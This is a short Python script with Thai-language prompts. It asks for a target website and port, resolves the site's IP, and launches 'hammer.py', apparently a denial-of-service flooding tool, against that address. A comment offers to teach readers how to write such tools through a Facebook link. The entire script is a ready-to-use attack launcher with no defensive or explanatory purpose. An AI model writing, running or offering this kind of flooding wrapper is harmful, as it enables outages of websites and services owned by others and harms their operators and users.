import os
import socket
import sys
from datetime import datetime
import subprocess, platform
#โอ้คุณอยากเรียนรู้วิธีการเขียนมันหรอคุณสามารถสอบถามผมได้ที่เฟสบุ๊ค https://www.facebook.com/messages/t/104704474962816
#บางทีผมอาจช่วยคุณได้

def clear():
    if platform.system() == "Windows":
        subprocess.Popen("cls",
                         shell=True).communicate()
    else:  # Linux and Mac
        print("\033c", end="")

clear()
print("this script made by bell")
print("")
print("")
print("")
print("ใส่ URL เว็บ")
print("ยกตัวอย่าง : example.com")
print("")
print("")
target = input("URL เป้าหมาย : ")
port = input("Port เป้าหมาย  : ")
IP = socket.gethostbyname(str(target))

print("IP ของเป้าหมาย " + str(IP) + " ไปที่ port " + str(port))

os.system("cd")
os.system("cd hammer")
os.system("python3 hammer.py -s "+str(IP) +" -p "+str(port)+ " -y 135")